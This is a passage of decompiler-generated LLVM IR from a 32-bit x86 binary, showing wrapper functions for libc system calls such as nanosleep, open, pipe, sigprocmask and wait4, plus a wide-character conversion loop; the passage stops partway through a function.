define i32 @function_804f67c(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f67c:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_804f67c = load i32, i32* @ebx, align 4
  store i32 %v0_804f67c, i32* %stack_var_-4, align 4
  %v4_804f680 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804f680, i32* %ebx.global-to-local, align 4
  %v6_804f68f = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_804f68f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_804f68f, -4095
  br i1 %tmp, label %dec_label_pc_804f6a8, label %dec_label_pc_804f69c

dec_label_pc_804f69c:                             ; preds = %dec_label_pc_804f67c
  %v0_804f69c = load i32, i32* %stack_var_-4, align 4
  %v1_804f69c = call i32 @function_804b7f4(i32 %v0_804f69c)
  %v0_804f6a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f6a1 = sub i32 0, %v0_804f6a1
  %v2_804f6a3 = inttoptr i32 %v1_804f69c to i32*
  store i32 %v1_804f6a1, i32* %v2_804f6a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f6a8

dec_label_pc_804f6a8:                             ; preds = %dec_label_pc_804f67c, %dec_label_pc_804f69c
  %v0_804f6a9 = phi i32 [ %v6_804f68f, %dec_label_pc_804f67c ], [ -1, %dec_label_pc_804f69c ]
  %v2_804f6ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f6ac, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f6a9

; uselistorder directives
  uselistorder i32 %v6_804f68f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f6a8, { 1, 0 }
}

define i32 @function_804f6b0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f6b0:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f6b3 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804f6b7 = sdiv i32 %sext, 16777216
  store i32 %v4_804f6b7, i32* @ecx, align 4
  %v4_804f6bb = ptrtoint i8* %arg1 to i32
  %v3_804f6bf = and i32 %arg2, 64
  %v4_804f6bf = icmp eq i32 %v3_804f6bf, 0
  br i1 %v4_804f6bf, label %dec_label_pc_804f6d0, label %dec_label_pc_804f6c4

dec_label_pc_804f6c4:                             ; preds = %dec_label_pc_804f6b0
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804f6d0

dec_label_pc_804f6d0:                             ; preds = %dec_label_pc_804f6b0, %dec_label_pc_804f6c4
  %v0_804f6d0 = phi i32 [ 0, %dec_label_pc_804f6b0 ], [ %phitmp, %dec_label_pc_804f6c4 ]
  store i32 %v0_804f6d0, i32* @edx, align 4
  store i32 %v4_804f6bb, i32* %ebx.global-to-local, align 4
  %v5_804f6db = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804f6b7)
  store i32 %v5_804f6db, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804f6db, -4095
  br i1 %tmp, label %dec_label_pc_804f6f3, label %dec_label_pc_804f6e7

dec_label_pc_804f6e7:                             ; preds = %dec_label_pc_804f6d0
  %v1_804f6e7 = call i32 @function_804b7f4(i32 %v0_804f6b3)
  %v0_804f6ec = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f6ec = sub i32 0, %v0_804f6ec
  %v2_804f6ee = inttoptr i32 %v1_804f6e7 to i32*
  store i32 %v1_804f6ec, i32* %v2_804f6ee, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f6f3

dec_label_pc_804f6f3:                             ; preds = %dec_label_pc_804f6d0, %dec_label_pc_804f6e7
  %v0_804f6f6 = phi i32 [ %v5_804f6db, %dec_label_pc_804f6d0 ], [ -1, %dec_label_pc_804f6e7 ]
  store i32 %v0_804f6b3, i32* @ebx, align 4
  ret i32 %v0_804f6f6

; uselistorder directives
  uselistorder i32 %v5_804f6db, { 1, 0, 2 }
  uselistorder i32 %v4_804f6b7, { 1, 0 }
  uselistorder i32 %v0_804f6b3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f6f3, { 1, 0 }
  uselistorder label %dec_label_pc_804f6d0, { 1, 0 }
}

define i32 @function_804f6fb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f6fb:
  %v3_804f70b = inttoptr i32 %arg1 to i8*
  %v4_804f70b = call i32 @function_804f6b0(i8* %v3_804f70b, i32 577, i32 %arg2)
  ret i32 %v4_804f70b

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @function_804f6b0, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
}

define i32 @function_804f714(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f714:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f714 = load i32, i32* @edi, align 4
  store i32 %v0_804f714, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804f71c = load i32, i32* @ebx, align 4
  %v1_804f724 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804f724 = call i32 @pipe([2 x i32] %v1_804f724)
  store i32 %v0_804f71c, i32* @ebx, align 4
  store i32 %v2_804f724, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804f724, -4095
  br i1 %tmp, label %dec_label_pc_804f73c, label %dec_label_pc_804f730

dec_label_pc_804f730:                             ; preds = %dec_label_pc_804f714
  %v1_804f730 = call i32 @function_804b7f4(i32 %v0_804f71c)
  %v0_804f735 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f735 = sub i32 0, %v0_804f735
  %v2_804f737 = inttoptr i32 %v1_804f730 to i32*
  store i32 %v1_804f735, i32* %v2_804f737, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f73c

dec_label_pc_804f73c:                             ; preds = %dec_label_pc_804f714, %dec_label_pc_804f730
  %v0_804f73d = phi i32 [ %v2_804f724, %dec_label_pc_804f714 ], [ -1, %dec_label_pc_804f730 ]
  %v2_804f740 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f740, i32* @edi, align 4
  ret i32 %v0_804f73d

; uselistorder directives
  uselistorder i32 %v2_804f724, { 1, 0, 2 }
  uselistorder i32 %v0_804f71c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f73c, { 1, 0 }
}

define i32 @function_804f744(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f744:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f745 = load i32, i32* @ebx, align 4
  %v0_804f749 = load i32, i32* @global_var_80584a4.184, align 4
  %v1_804f749 = icmp eq i32 %v0_804f749, 0
  %v1_804f754 = icmp eq i1 %v1_804f749, false
  br i1 %v1_804f754, label %dec_label_pc_804f767, label %dec_label_pc_804f756

dec_label_pc_804f756:                             ; preds = %dec_label_pc_804f744
  %v1_804f75b = call i32 @function_8051018(i32 0)
  %v2_804f763 = icmp slt i32 %v1_804f75b, 0
  br i1 %v2_804f763, label %dec_label_pc_804f789, label %dec_label_pc_804f756.dec_label_pc_804f767_crit_edge

dec_label_pc_804f756.dec_label_pc_804f767_crit_edge: ; preds = %dec_label_pc_804f756
  %v0_804f769.pre = load i32, i32* @global_var_80584a4.184, align 4
  br label %dec_label_pc_804f767

dec_label_pc_804f767:                             ; preds = %dec_label_pc_804f756.dec_label_pc_804f767_crit_edge, %dec_label_pc_804f744
  %v0_804f777 = phi i32 [ %v0_804f769.pre, %dec_label_pc_804f756.dec_label_pc_804f767_crit_edge ], [ %v0_804f749, %dec_label_pc_804f744 ]
  %v1_804f767 = icmp eq i32 %arg1, 0
  %v1_804f76e = icmp eq i1 %v1_804f767, false
  br i1 %v1_804f76e, label %dec_label_pc_804f774, label %dec_label_pc_804f770

dec_label_pc_804f770:                             ; preds = %dec_label_pc_804f767
  br label %dec_label_pc_804f78c

dec_label_pc_804f774:                             ; preds = %dec_label_pc_804f767
  store i32 %v0_804f777, i32* @ebx, align 4
  %v2_804f779 = add i32 %v0_804f777, %arg1
  %v1_804f77d = call i32 @function_8051018(i32 %v2_804f779)
  %v2_804f785 = icmp slt i32 %v1_804f77d, 0
  %v1_804f787 = icmp eq i1 %v2_804f785, false
  br i1 %v1_804f787, label %dec_label_pc_804f774.dec_label_pc_804f78c_crit_edge, label %dec_label_pc_804f789

dec_label_pc_804f774.dec_label_pc_804f78c_crit_edge: ; preds = %dec_label_pc_804f774
  %v0_804f78d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f78c

dec_label_pc_804f789:                             ; preds = %dec_label_pc_804f774, %dec_label_pc_804f756
  br label %dec_label_pc_804f78c

dec_label_pc_804f78c:                             ; preds = %dec_label_pc_804f774.dec_label_pc_804f78c_crit_edge, %dec_label_pc_804f770, %dec_label_pc_804f789
  %v0_804f78d = phi i32 [ %v0_804f78d.pre, %dec_label_pc_804f774.dec_label_pc_804f78c_crit_edge ], [ %v0_804f777, %dec_label_pc_804f770 ], [ -1, %dec_label_pc_804f789 ]
  %v2_804f78c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f78c, i32* @edx, align 4
  store i32 %v0_804f745, i32* @ebx, align 4
  ret i32 %v0_804f78d

; uselistorder directives
  uselistorder i32 %v0_804f777, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8051018, { 1, 0 }
  uselistorder label %dec_label_pc_804f78c, { 2, 0, 1 }
}

define i32 @function_804f794(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f794:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804f795 = load i32, i32* @esi, align 4
  %v4_804f799 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804f799, i32* @ecx, align 4
  %v2_804f7a5 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804f7a5, label %dec_label_pc_804f7be, label %dec_label_pc_804f7a9

dec_label_pc_804f7a9:                             ; preds = %dec_label_pc_804f794
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804f7be, label %dec_label_pc_804f7ae

dec_label_pc_804f7ae:                             ; preds = %dec_label_pc_804f7a9
  %v1_804f7ae = call i32 @function_804b7f4(i32 %v0_804f795)
  %v1_804f7b3 = inttoptr i32 %v1_804f7ae to i32*
  store i32 22, i32* %v1_804f7b3, align 4
  br label %dec_label_pc_804f7e5

dec_label_pc_804f7be:                             ; preds = %dec_label_pc_804f7a9, %dec_label_pc_804f794
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804f7c3 = load i32, i32* @ebx, align 4
  %v7_804f7cb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804f7c3, i32* @ebx, align 4
  store i32 %v7_804f7cb, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804f7cb, -4095
  br i1 %tmp11, label %dec_label_pc_804f7e5, label %dec_label_pc_804f7d7

dec_label_pc_804f7d7:                             ; preds = %dec_label_pc_804f7be
  %v1_804f7d7 = call i32 @function_804b7f4(i32 %v0_804f7c3)
  %v0_804f7dc = load i32, i32* %esi.global-to-local, align 4
  %v1_804f7dc = sub i32 0, %v0_804f7dc
  %v2_804f7de = inttoptr i32 %v1_804f7d7 to i32*
  store i32 %v1_804f7dc, i32* %v2_804f7de, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f7e5

dec_label_pc_804f7e5:                             ; preds = %dec_label_pc_804f7d7, %dec_label_pc_804f7be, %dec_label_pc_804f7ae
  %storemerge = phi i32 [ -1, %dec_label_pc_804f7ae ], [ %v7_804f7cb, %dec_label_pc_804f7be ], [ -1, %dec_label_pc_804f7d7 ]
  %v2_804f7e5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f7e5, i32* @edx, align 4
  store i32 %v0_804f795, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804f7cb, { 1, 0, 2 }
  uselistorder i32 %v0_804f7c3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804f7ec(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_804f7ec:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f7ed = load i32, i32* @esi, align 4
  store i32 %v0_804f7ed, i32* %stack_var_-8, align 4
  %v4_804f7fd = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_804f7fd, i32* %esi.global-to-local, align 4
  %v0_804f801 = load i32, i32* @ebx, align 4
  %v6_804f809 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_804f801, i32* @ebx, align 4
  store i32 %v6_804f809, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_804f809, -4095
  br i1 %tmp, label %dec_label_pc_804f821, label %dec_label_pc_804f815

dec_label_pc_804f815:                             ; preds = %dec_label_pc_804f7ec
  %v1_804f815 = call i32 @function_804b7f4(i32 %v0_804f801)
  %v0_804f81a = load i32, i32* %esi.global-to-local, align 4
  %v1_804f81a = sub i32 0, %v0_804f81a
  %v2_804f81c = inttoptr i32 %v1_804f815 to i32*
  store i32 %v1_804f81a, i32* %v2_804f81c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f821

dec_label_pc_804f821:                             ; preds = %dec_label_pc_804f7ec, %dec_label_pc_804f815
  %v0_804f822 = phi i32 [ %v6_804f809, %dec_label_pc_804f7ec ], [ -1, %dec_label_pc_804f815 ]
  %v2_804f824 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f824, i32* @esi, align 4
  ret i32 %v0_804f822

; uselistorder directives
  uselistorder i32 %v6_804f809, { 1, 0, 2 }
  uselistorder i32 %v0_804f801, { 1, 0 }
  uselistorder label %dec_label_pc_804f821, { 1, 0 }
}

define i32 @function_804f828() local_unnamed_addr {
dec_label_pc_804f828:
  ret i32 ptrtoint (i32* @global_var_8058484.185 to i32)
}

define i32 @function_804f830() local_unnamed_addr {
dec_label_pc_804f830:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804f83b = icmp eq i32 %tmp4, 0
  %v1_804f83d = icmp eq i1 %v1_804f83b, false
  br i1 %v1_804f83d, label %dec_label_pc_804f845, label %dec_label_pc_804f83f

dec_label_pc_804f83f:                             ; preds = %dec_label_pc_804f830
  %v2_804f83f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804f845

dec_label_pc_804f845:                             ; preds = %dec_label_pc_804f830, %dec_label_pc_804f83f
  %v0_804f861 = phi i32 [ %tmp4, %dec_label_pc_804f830 ], [ %v2_804f83f, %dec_label_pc_804f83f ]
  %v0_804f84d = phi i32 [ %tmp3, %dec_label_pc_804f830 ], [ 0, %dec_label_pc_804f83f ]
  %v2_804f845 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_804f845, i32* %stack_var_-8, align 4
  store i32 %v0_804f84d, i32* %stack_var_-4, align 4
  %v2_804f85c = ptrtoint i32* %stack_var_-8 to i32
  %v5_804f862 = inttoptr i32 %v0_804f861 to i8*
  %v6_804f862 = call i32 @function_804f898(i8* %v5_804f862, i32 %v2_804f85c, i32 1, i32 16, i32 %tmp)
  %v1_804f86c = icmp eq i32 %v6_804f862, 0
  %v3_804f86e = select i1 %v1_804f86c, i32 1, i32 %v6_804f862
  ret i32 %v3_804f86e

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804f845, { 1, 0 }
}

define i32 @function_804f878() local_unnamed_addr {
dec_label_pc_804f878:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804f88d = inttoptr i32 %tmp to i8*
  %v6_804f88d = call i32 @function_804f898(i8* %v5_804f88d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804f88d
}

define i32 @function_804f898(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804f898:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_804f89b = load i32, i32* @ebx, align 4
  %v4_804f89f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f89f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804f8af = icmp eq i8* %arg1, null
  store i1 %v1_804f8af, i1* %zf.global-to-local, align 1
  br i1 %v1_804f8af, label %dec_label_pc_804f8be, label %dec_label_pc_804f8b3

dec_label_pc_804f8b3:                             ; preds = %dec_label_pc_804f898
  %v12_804f8b3 = icmp eq i32 %v4_804f89f, %arg2
  store i1 %v12_804f8b3, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804f8ba = icmp eq i1 %v12_804f8b3, false
  br i1 %v1_804f8ba, label %dec_label_pc_804f8e1, label %dec_label_pc_804f8db

dec_label_pc_804f8be:                             ; preds = %dec_label_pc_804f898
  %v2_804f8be = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f8be, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804f8df

dec_label_pc_804f8c7:                             ; preds = %dec_label_pc_804f8ef
  %v1_804f8c7 = call i32 @function_804b7f4(i32 %v0_804f89b)
  %v1_804f8cc = inttoptr i32 %v1_804f8c7 to i32*
  store i32 84, i32* %v1_804f8cc, align 4
  br label %dec_label_pc_804f915

dec_label_pc_804f8d7:                             ; preds = %dec_label_pc_804f8f6
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804f90a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f906

dec_label_pc_804f8db:                             ; preds = %dec_label_pc_804f8b3
  %v2_804f8db = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f8db, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f8df

dec_label_pc_804f8df:                             ; preds = %dec_label_pc_804f8be, %dec_label_pc_804f8db
  %v2_804f8f816 = phi i32 [ %v2_804f8be, %dec_label_pc_804f8be ], [ %v2_804f8db, %dec_label_pc_804f8db ]
  %v1_804f8e412 = phi i32 [ -1, %dec_label_pc_804f8be ], [ %arg4, %dec_label_pc_804f8db ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f8e1

dec_label_pc_804f8e1:                             ; preds = %dec_label_pc_804f8b3, %dec_label_pc_804f8df
  %v2_804f8f815 = phi i32 [ %v4_804f89f, %dec_label_pc_804f8b3 ], [ %v2_804f8f816, %dec_label_pc_804f8df ]
  %v0_804f8e6 = phi i32 [ %arg4, %dec_label_pc_804f8b3 ], [ %v1_804f8e412, %dec_label_pc_804f8df ]
  %v1_804f8e1 = inttoptr i32 %arg2 to i32*
  %v2_804f8e1 = load i32, i32* %v1_804f8e1, align 4
  store i32 %v2_804f8e1, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_804f8e6, %arg3
  %v5_804f8e8 = select i1 %tmp31, i32 %arg3, i32 %v0_804f8e6
  store i32 %v5_804f8e8, i32* %edi.global-to-local, align 4
  store i32 %v5_804f8e8, i32* @ecx, align 4
  %v1_804f9023 = icmp eq i32 %v5_804f8e8, 0
  store i1 %v1_804f9023, i1* %zf.global-to-local, align 1
  %v1_804f90410 = icmp eq i1 %v1_804f9023, false
  br i1 %v1_804f90410, label %dec_label_pc_804f8ef, label %dec_label_pc_804f906

dec_label_pc_804f8ef:                             ; preds = %dec_label_pc_804f8e1, %dec_label_pc_804f8fc
  %v2_804f8f8 = phi i32 [ %v2_804f8ff, %dec_label_pc_804f8fc ], [ %v2_804f8f815, %dec_label_pc_804f8e1 ]
  %v0_804f8ef = phi i32 [ %v1_804f8fc, %dec_label_pc_804f8fc ], [ %v2_804f8e1, %dec_label_pc_804f8e1 ]
  %v1_804f8ef = inttoptr i32 %v0_804f8ef to i32*
  %v2_804f8ef = load i32, i32* %v1_804f8ef, align 4
  %v9_804f8f1 = icmp eq i32 %v2_804f8ef, 127
  store i1 %v9_804f8f1, i1* %zf.global-to-local, align 1
  %v6_804f8f4 = icmp ugt i32 %v2_804f8ef, 127
  br i1 %v6_804f8f4, label %dec_label_pc_804f8c7, label %dec_label_pc_804f8f6

dec_label_pc_804f8f6:                             ; preds = %dec_label_pc_804f8ef
  %v3_804f8f6 = trunc i32 %v2_804f8ef to i8
  %v4_804f8f6 = icmp eq i8 %v3_804f8f6, 0
  store i1 %v4_804f8f6, i1* %zf.global-to-local, align 1
  %v3_804f8f8 = inttoptr i32 %v2_804f8f8 to i8*
  store i8 %v3_804f8f6, i8* %v3_804f8f8, align 1
  %v0_804f8fa = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804f8fa, label %dec_label_pc_804f8d7, label %dec_label_pc_804f8fc

dec_label_pc_804f8fc:                             ; preds = %dec_label_pc_804f8f6
  %v0_804f8fc = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f8fc = add i32 %v0_804f8fc, 4
  store i32 %v1_804f8fc, i32* %ebx.global-to-local, align 4
  %v0_804f8ff = load i32, i32* %edx.global-to-local, align 4
  %v1_804f8ff = load i32, i32* %esi.global-to-local, align 4
  %v2_804f8ff = add i32 %v1_804f8ff, %v0_804f8ff
  store i32 %v2_804f8ff, i32* %edx.global-to-local, align 4
  %v0_804f901 = load i32, i32* @ecx, align 4
  %v1_804f901 = add i32 %v0_804f901, -1
  %v8_804f901 = icmp eq i32 %v1_804f901, 0
  store i32 %v1_804f901, i32* @ecx, align 4
  store i1 %v8_804f901, i1* %zf.global-to-local, align 1
  %v1_804f904 = icmp eq i1 %v8_804f901, false
  br i1 %v1_804f904, label %dec_label_pc_804f8ef, label %dec_label_pc_804f906

dec_label_pc_804f906:                             ; preds = %dec_label_pc_804f8fc, %dec_label_pc_804f8e1, %dec_label_pc_804f8d7
  %v0_804f90e = phi i32 [ 0, %dec_label_pc_804f8d7 ], [ %v2_804f8e1, %dec_label_pc_804f8e1 ], [ %v1_804f8fc, %dec_label_pc_804f8fc ]
  %v0_804f90a = phi i32 [ %v0_804f90a.pre, %dec_label_pc_804f8d7 ], [ %v2_804f8f815, %dec_label_pc_804f8e1 ], [ %v2_804f8ff, %dec_label_pc_804f8fc ]
  %v2_804f906 = ptrtoint i32* %stack_var_-32 to i32
  %v12_804f90a = icmp eq i32 %v0_804f90a, %v2_804f906
  store i1 %v12_804f90a, i1* %zf.global-to-local, align 1
  br i1 %v12_804f90a, label %dec_label_pc_804f911, label %dec_label_pc_804f90e

dec_label_pc_804f90e:                             ; preds = %dec_label_pc_804f906
  %v1_804f90e = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f90e = inttoptr i32 %v1_804f90e to i32*
  store i32 %v0_804f90e, i32* %v2_804f90e, align 4
  br label %dec_label_pc_804f911

dec_label_pc_804f911:                             ; preds = %dec_label_pc_804f906, %dec_label_pc_804f90e
  %v0_804f911 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f913 = load i32, i32* @ecx, align 4
  %v2_804f913 = sub i32 %v0_804f911, %v1_804f913
  %v12_804f913 = icmp eq i32 %v2_804f913, 0
  br label %dec_label_pc_804f915

dec_label_pc_804f915:                             ; preds = %dec_label_pc_804f8c7, %dec_label_pc_804f911
  %storemerge = phi i1 [ %v12_804f913, %dec_label_pc_804f911 ], [ false, %dec_label_pc_804f8c7 ]
  %storemerge1 = phi i32 [ %v2_804f913, %dec_label_pc_804f911 ], [ -1, %dec_label_pc_804f8c7 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_804f915 = load i32, i32* @esp, align 4
  %v9_804f915 = icmp eq i32 %v0_804f915, -28
  store i1 %v9_804f915, i1* %zf.global-to-local, align 1
  store i32 %v0_804f89b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_804f90a, { 1, 0 }
  uselistorder i32 %v2_804f8ff, { 0, 2, 1 }
  uselistorder i32 %v1_804f8fc, { 0, 2, 1 }
  uselistorder i32 %v2_804f8ef, { 1, 2, 0 }
  uselistorder i32 %v2_804f8e1, { 1, 0, 2 }
  uselistorder i32 %v0_804f8e6, { 1, 0 }
  uselistorder i32 %v2_804f8f815, { 1, 0 }
  uselistorder i1 %v12_804f8b3, { 1, 0 }
  uselistorder i32 %v4_804f89f, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 12, 2, 7, 4, 5, 6, 0, 8, 3, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 6, 3, 7, 4, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f915, { 1, 0 }
  uselistorder label %dec_label_pc_804f911, { 1, 0 }
  uselistorder label %dec_label_pc_804f8ef, { 1, 0 }
  uselistorder label %dec_label_pc_804f8e1, { 1, 0 }
  uselistorder label %dec_label_pc_804f8df, { 1, 0 }
}

define i32 @function_804f920(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f920:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f920 = load i32, i32* @ebx, align 4
  store i32 %v0_804f920, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804f92b = call i32 @function_804f39c(i32 %arg1, i32 3, i32 %tmp11, i32 %tmp7)
  store i32 %v4_804f92b, i32* @eax, align 4
  %v10_804f935 = icmp eq i32 %v4_804f92b, -1
  br i1 %v10_804f935, label %dec_label_pc_804f94c, label %dec_label_pc_804f93a

dec_label_pc_804f93a:                             ; preds = %dec_label_pc_804f920
  %v0_804f93a = load i32, i32* @ebx, align 4
  %v4_804f942 = inttoptr i32 %arg2 to i8*
  %v5_804f942 = call i32 @function_804bcc8(i32 %v4_804f92b, i8* %v4_804f942, i32 0, i32 %v0_804f93a)
  br label %dec_label_pc_804f94c

dec_label_pc_804f94c:                             ; preds = %dec_label_pc_804f920, %dec_label_pc_804f93a
  %v0_804f94c = phi i32 [ 0, %dec_label_pc_804f920 ], [ %v5_804f942, %dec_label_pc_804f93a ]
  %v2_804f950 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f950, i32* @ebx, align 4
  ret i32 %v0_804f94c

; uselistorder directives
  uselistorder i32 %v4_804f92b, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f39c, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f94c, { 1, 0 }
}

define i32 @function_804f954(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f954:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_804f955 = load i32, i32* @edi, align 4
  %v0_804f957 = load i32, i32* @ebx, align 4
  %v15_804f958 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804f95b = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f95b, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804f9674 = icmp eq i32 %arg3, 0
  store i1 %v1_804f9674, i1* %zf.global-to-local, align 1
  br i1 %v1_804f9674, label %dec_label_pc_804f9c8, label %dec_label_pc_804f96c.lr.ph

dec_label_pc_804f96c.lr.ph:                       ; preds = %dec_label_pc_804f954
  br label %dec_label_pc_804f96c

dec_label_pc_804f96c:                             ; preds = %dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge, %dec_label_pc_804f96c.lr.ph
